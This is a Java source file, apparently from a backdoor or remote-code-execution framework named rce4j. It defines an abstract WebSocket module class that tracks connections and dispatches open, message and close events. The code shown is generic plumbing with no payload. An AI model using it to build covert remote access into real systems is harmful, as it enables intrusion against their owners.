package org.rce4j.module;

import org.rce4j.module.event.BackdoorWsEvent;
import org.rce4j.net.WsConnection;

import java.util.Collection;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public abstract class BackdoorWsModule implements BackdoorModule<BackdoorWsEvent> {
    public BackdoorWsModule(String name, ModulePath path) {
        this.name = name;
        this.path = path;
    }
    
    protected final String name;
    protected final ModulePath path;
    
    private final Map<String, WsConnection> connections = new ConcurrentHashMap<>();
    
    public void onOpen(BackdoorWsEvent event) {}
    
    public void onMessage(BackdoorWsEvent event) {}
    
    public void onClose(BackdoorWsEvent event) {}
    
    
    public final void on(BackdoorWsEvent event) {
        switch (event.getType()) {
            case CONNECT -> {
                connections.put(event.getConnection().getId(), event.getConnection());
                onOpen(event);
            }
            case MESSAGE -> onMessage(event);
            case CLOSE -> {
                WsConnection connection = event.getConnection();
                
                connections.remove(connection.getId());
                onClose(event);
                
                connection.close();
            }
        }
    }
    
    public final String getName() {
        return name;
    }
    
    public final ModulePath getPath() {
        return path;
    }
    
    protected WsConnection getConnection(String id) {
        return connections.get(id);
    }
    
    protected Collection<WsConnection> getConnections() {
        return connections.values();
    }
}
